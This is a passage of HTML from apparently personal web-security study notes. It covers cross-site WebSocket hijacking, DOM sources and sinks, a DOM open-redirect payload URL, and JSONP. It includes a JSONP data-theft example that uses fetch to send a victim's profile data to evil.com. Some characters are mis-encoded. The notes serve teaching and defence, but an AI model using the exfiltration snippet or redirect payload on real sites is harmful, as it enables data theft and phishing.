                      <li style="margin-bottom: 10px;">In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.</li>
                      <li style="margin-bottom: 10px;">For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket</code>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;">The <code>Sec-WebSocket-Key</code> header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.</p>
                    </div>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.</li>
                      <li style="margin-bottom: 10px;">Sending WebSocket messages to retrieve sensitive data.</li>
                      <li style="margin-bottom: 10px;">Sometimes, just waiting for incoming messages to arrive containing sensitive data.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to secure a WebSocket connection? &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Use the <code>wss://</code> protocol (WebSockets over TLS).</li>
                      <li style="margin-bottom: 10px;">Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.</li>
                      <li style="margin-bottom: 10px;">Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.</li>
                      <li style="margin-bottom: 10px;">Treat data received via the WebSocket as untrusted in both directions.</li>
                      <li style="margin-bottom: 10px;">Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/WebSockets-Basics" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">WebSockets Basics <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  DOM-Based Vulnerabilities
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; Intro &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">What is DOM?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Document Object Model</strong></li>
                      <li style="margin-bottom: 10px;">Standard</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; Programming interface for web documents that represent web pages as tree of objects</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The HTML elements as <strong>objects</strong></li>
                      <li style="margin-bottom: 10px;">The <strong>properties</strong> of all HTML elements</li>
                      <li style="margin-bottom: 10px;">The <strong>methods</strong> to access all HTML elements</li>
                      <li style="margin-bottom: 10px;">The <strong>events</strong> for all HTML elements</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; allow programming languages same JS to interact and read and change &lt; HTML element &gt; page is content, style and structure</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; When web page loaded browser create DOM of page</strong></p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;My Page&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Welcome&lt;/h1&gt;
    &lt;p id="main"&gt;This is a paragraph.&lt;/p&gt;
    &lt;button&gt;Click Me&lt;/button&gt;
&lt;/body&gt;
&lt;/html&gt;

--------------------

Document
Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ html (root element)
    Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ head
    Ã¢â€â€š   Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ title
    Ã¢â€â€š       Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ "My Page"
    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ body
        Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ h1
        Ã¢â€â€š   Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ "Welcome"
        Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ p (with id="main")
        Ã¢â€â€š   Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ "This is a paragraph."
        Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ button
            Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ "Click Me"</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Why is the DOM So Important?</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">Without the DOM, web pages would be <strong>static</strong>. They would just be documents you read, like a PDF. The DOM is the fundamental bridge that allows JavaScript to make web pages <strong>interactive, dynamic, and responsive</strong>, turning them into full-fledged <strong>web applications</strong>.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">What is BOM?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Browser Object Model</li>
                      <li style="margin-bottom: 10px;">Browser Based</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Manage browser windows and enable communication between windows.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>DOM is part of BOM</strong></li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is Source and sink &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Source &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; A source is a JavaScript property that accepts data that is potentially attacker-controlled.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">An example of a source is the <code>location.search</code> property because it reads input from the query string, which is relatively simple for an attacker to control.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Ultimately, any property that can be controlled by the attacker is a potential source.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">This includes the referring URL (exposed by the <code>document.referrer</code> string), the user's cookies (exposed by the <code>document.cookie</code> string), and web messages.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The most common source is the URL, which is typically accessed with the <code>location</code> object.</p>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Common Sources &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Sink Functions &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; unsafe JS function or DOM object which the source value is passed.</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it.</li>
                      <li style="margin-bottom: 10px;">For example, the <code>eval()</code> function is a sink because it processes the argument that is passed to it as JavaScript.</li>
                      <li style="margin-bottom: 10px;">An example of an HTML sink is <code>document.body.innerHTML</code> because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Common Sinks &rarr;</p>
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">DOM-based vulnerability</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Example sink</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">DOM XSS</td>
                            <td style="padding: 15px;"><code>document.write()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Open redirection</td>
                            <td style="padding: 15px;"><code>window.location</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Cookie manipulation</td>
                            <td style="padding: 15px;"><code>document.cookie</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">JavaScript injection</td>
                            <td style="padding: 15px;"><code>eval()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Document-domain manipulation</td>
                            <td style="padding: 15px;"><code>document.domain</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">WebSocket-URL poisoning</td>
                            <td style="padding: 15px;"><code>WebSocket()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Link manipulation</td>
                            <td style="padding: 15px;"><code>element.src</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Web message manipulation</td>
                            <td style="padding: 15px;"><code>postMessage()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Ajax request-header manipulation</td>
                            <td style="padding: 15px;"><code>setRequestHeader()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Local file-path manipulation</td>
                            <td style="padding: 15px;"><code>FileReader.readAsText()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Client-side SQL injection</td>
                            <td style="padding: 15px;"><code>ExecuteSql()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">HTML5-storage manipulation</td>
                            <td style="padding: 15px;"><code>sessionStorage.setItem()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Client-side XPath injection</td>
                            <td style="padding: 15px;"><code>document.evaluate()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">Client-side JSON injection</td>
                            <td style="padding: 15px;"><code>JSON.parse()</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;">DOM-data manipulation</td>
                            <td style="padding: 15px;"><code>element.setAttribute()</code></td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;">Denial of service</td>
                            <td style="padding: 15px;"><code>RegExp()</code></td>
                          </tr>
                        </tbody>
                      </table>
                    </div>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Example &rarr;</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Consider the following code &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
&nbsp;&nbsp;location = goto;
}</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">This is vulnerable to DOM-based open redirection because the <code>location.hash</code> source is handled in an unsafe way.</li>
                      <li style="margin-bottom: 10px;">If the URL contains a hash fragment that starts with <code>https:</code>, this code extracts the value of the <code>location.hash</code> property and sets it as the <code>location</code> property of the <code>window</code>.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; attacker could exploit this vulnerability by constructing the following URL &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">https://www.innocent-website.com/example#https://www.evil-user.net</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">When a victim visits this URL, the JavaScript sets the value of the <code>location</code> property to <code>https://www.evil-user.net</code>, which automatically redirects the victim to the malicious site. This behavior could easily be exploited to construct a phishing attack, for example.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">The following are some of the main sinks that can lead to DOM-XSS vulnerabilities &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent</code>
                    
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()</code>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Difference Between HTML Sink and JS Sink &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">HTML Sinks &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Definition</strong>: Sinks that insert attacker-controlled input directly into the <strong>HTML/DOM structure</strong>.</li>
                      <li style="margin-bottom: 10px;">The browser <strong>parses the input as HTML</strong>, so if the attacker injects tags (<code>&lt;script&gt;</code>, <code>&lt;img onerror&gt;</code>, etc.), they can execute code.</li>
                      <li style="margin-bottom: 10px;">Execution happens because the input is interpreted as markup.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
element.insertAdjacentHTML("beforeend", userInput);
iframe.srcdoc = userInput;</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">JavaScript Sinks &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Definition</strong>: Sinks that interpret attacker-controlled input as <strong>JavaScript code</strong>.</li>
                      <li style="margin-bottom: 10px;">The input isnÃ¢â‚¬â„¢t just parsed as HTML Ã¢â‚¬â€ itÃ¢â‚¬â„¢s <strong>executed directly as JS</strong>.</li>
                      <li style="margin-bottom: 10px;">These are usually more dangerous because the attacker injects raw code.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">eval(userInput);
setTimeout(userInput, 1000);  // if string used
setInterval(userInput, 1000);
new Function(userInput)();</code>

                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; How to prevent DOM-based taint-flow vulnerabilities &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">There is no single action you can take to eliminate the threat of DOM-based attacks entirely. However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is to <strong>avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.</strong></li>
                      <li style="margin-bottom: 10px;">If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code.</li>
                    </ul>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">In many cases, the relevant data can be validated on a whitelist basis, only allowing content that is known to be safe.</li>
                      <li style="margin-bottom: 10px;">In other cases, it will be necessary to sanitize or encode the data.</li>
                      <li style="margin-bottom: 10px;">This can be a complex task, and depending on the context into which the data is to be inserted, may involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.</li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; JSON With Padding (JSONP) &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Technique that was historically used to <strong>bypass the Same-Origin Policy (SOP)</strong> for retrieving data from another domain via a <code>&lt;script&gt;</code> tag.</li>
                      <li style="margin-bottom: 10px;">It is <strong>not standard JSON</strong>, but JSON wrapped in a <strong>function call</strong>.</li>
                      <li style="margin-bottom: 10px;"><code>&lt;script&gt;</code> tags <strong>can load scripts from any domain</strong>.</li>
                      <li style="margin-bottom: 10px;">JSONP exploits this to get data cross-domain.</li>
                      <li style="margin-bottom: 10px;">Only works for <strong>GET requests</strong>.</li>
                      <li style="margin-bottom: 10px;">Vulnerable to <strong>XSS</strong> if the callback name or data is not properly sanitized.</li>
                      <li style="margin-bottom: 10px;">Not widely used today Ã¢â‚¬â€ <strong>CORS</strong> is the modern replacement.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Normal (Legitimate) JSONP Scenario &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; the website &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">https://victim.com</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; load user data from &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">https://api.victim.com/profile?callback=handleData</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; the code is &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;script&gt;
function handleData(data) {
    console.log("User:", data.username);
}
&lt;/script&gt;

&lt;script src="https://api.victim.com/profile?callback=handleData"&gt;&lt;/script&gt;</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; server response is &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">handleData({"username":"alice","role":"admin"});</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Now the Vulnerable Scenario &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Assume the API &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">https://api.victim.com/profile</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Returns sensitive data</li>
                      <li style="margin-bottom: 10px;">Uses session cookies for authentication</li>
                      <li style="margin-bottom: 10px;">Supports JSONP</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Example request &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">https://api.victim.com/profile?callback=whatever</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Attack Scenario (Data Theft) &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">Step 1 Ã¢â‚¬â€ Attacker creates malicious page</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Attacker hosts this on &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">https://evil.com</code>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;script&gt;
function steal(data) {
  fetch("https://evil.com/log?data="+JSON.stringify(data));
}
&lt;/script&gt;

&lt;script src="https://api.victim.com/profile?callback=steal"&gt;&lt;/script&gt;</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">What Happens &rarr;</p>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">Victim is logged into <code>victim.com</code></li>
                      <li style="margin-bottom: 10px;">Victim visits <code>evil.com</code></li>
                      <li style="margin-bottom: 10px;">Browser loads:
                        <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 1rem; margin-top: 10px; margin-bottom: 10px; overflow-x: auto;">https://api.victim.com/profile?callback=steal</code>
                      </li>
                      <li style="margin-bottom: 10px;">Browser automatically sends victimÃ¢â‚¬â„¢s cookies</li>
                      <li style="margin-bottom: 10px;">Server responds:
                        <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 1rem; margin-top: 10px; margin-bottom: 10px; overflow-x: auto;">steal({"username":"alice","email":"alice@victim.com"});</code>
                      </li>
                      <li style="margin-bottom: 10px;">The <code>steal()</code> function runs in victim's browser</li>
                      <li style="margin-bottom: 10px;">Data is sent to attacker</li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/DOM-Based-XSS-1" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">DOM-Based XSS <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/DOM-based-open-redirection" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">DOM Open Redirection <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/DOM-based-cookie-manipulation" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">DOM Cookie Manipulation <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Web-Message-Vulnerabilities" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Web Message Vulns <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                  </div>
                </div>
              </div>
            </article>

          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Authentication
